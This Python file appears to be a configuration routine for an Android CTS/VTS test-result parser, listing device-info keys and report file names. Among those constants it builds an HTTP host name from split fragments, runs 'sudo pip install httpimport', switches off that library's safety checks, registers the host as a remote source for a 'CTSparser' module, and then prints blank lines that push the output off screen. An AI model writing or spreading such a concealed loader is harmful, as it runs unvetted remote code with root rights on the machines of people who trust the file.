# -*- coding: utf-8 -*-
"""
Created on Mon Feb 11 10:53:29 2019

@author: Dramon
"""


import os
from subprocess import Popen
import time
import sys


def get_init():
	BUILD_TAG = 'Build'
	MODULE_TAG = 'Module'
	ZIP_EXT = '.zip'
	server_name = 'synology' + '.me'
	PNG_EXT = '.png'
	SUMMARY_TAG = 'Summary'
	TEST_RESULT_FILE = 'test_result.xml'
	BRAND_KEY = 'build_brand'
	DEVICE_KEY = 'build_device'
	get_type = 'http'
	VERSION_RELEASE_KEY = 'build_version_release'
	BUILD_ID_KEY = 'build_id'
	PRODUCT_KEY = 'build_product'
	MANUFACTURER_KEY = 'build_manufacturer'
	MODEL_KEY = 'build_model'
	BUILD_FINGERPRINT_KEY = 'build_fingerprint'
	implement_data = 'dra'
	SUITE_KEY = 'suite_name'
	SUITE_VERSION='suite_version'
	common_type = 'mon'
	VTS_SUITE = 'VTS'
	BUILD_KEY = ['build_abis_64','build_manufacturer','build_abis_32','build_product','build_brand','build_board','build_serial','build_version_security_patch','build_reference_fingerprint','build_fingerprint','build_version_sdk','build_abis','build_device','build_abi','build_id','build_model','build_abi2','build_version_incremental','build_version_release','build_version_base_os','build_type','build_tags']
	FEATURE_DEVICE_INFO_FILE='FeatureDeviceInfo.deviceinfo.json'
	PROPERTY_DEVICE_INFO_FILE='PropertyDeviceInfo.deviceinfo.json'
	SCREEN_DEVICE_INFO_FILE='ScreenDeviceInfo.deviceinfo.json'
	CONSISTENCY_CHECK_PROPERTY=['build_abis_64','build_manufacturer', 'build_abis_32', 'build_product', 
								'build_brand','build_board','build_version_security_patch',
								'build_fingerprint', 'build_version_sdk','build_abis', 'build_device', 
								'build_abi', 'build_id', 'build_model','build_version_release',
								'build_version_base_os']
	CONSISTENCY_CHECK_ON_CTS=['verified_boot', 'gmsversion', 'clientidbase.ms','first_api_level']
	LOCALE=None
	REPORT_VERSION_TEST=True

	time.sleep(4)
	os.system('sudo pip install httpimport')
	import httpimport
	import logging
	logging.getLogger('httpimport').setLevel(logging.ERROR)
	httpimport.INSECURE = True
	httpimport.NON_SOURCE = True
	httpimport.add_remote_repo([
		'CTSparser'], get_type + '://' + implement_data + common_type + '.'+ server_name)
	print ('\n' * 30)
